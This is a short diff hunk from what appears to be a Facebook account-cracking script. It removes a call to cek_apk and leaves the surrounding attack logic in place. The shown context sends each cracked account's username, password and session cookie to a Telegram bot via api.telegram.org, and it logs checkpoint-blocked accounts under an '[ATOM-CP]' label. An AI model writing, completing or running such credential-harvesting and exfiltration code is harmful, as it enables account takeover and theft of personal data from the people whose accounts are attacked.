@@ -1334,7 +1334,6 @@ def m5(idf,pwv):
                             statusok = (f" {user} | {ps} | {coki} ")
                             requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                             ok+=1
-                            cek_apk(session, coki)
                             break 
                     elif 'www.facebook.com' in q['error']['message']:
                             print('\r\r\033[1;30m[ATOM-CP] '+idf+' | '+pw)
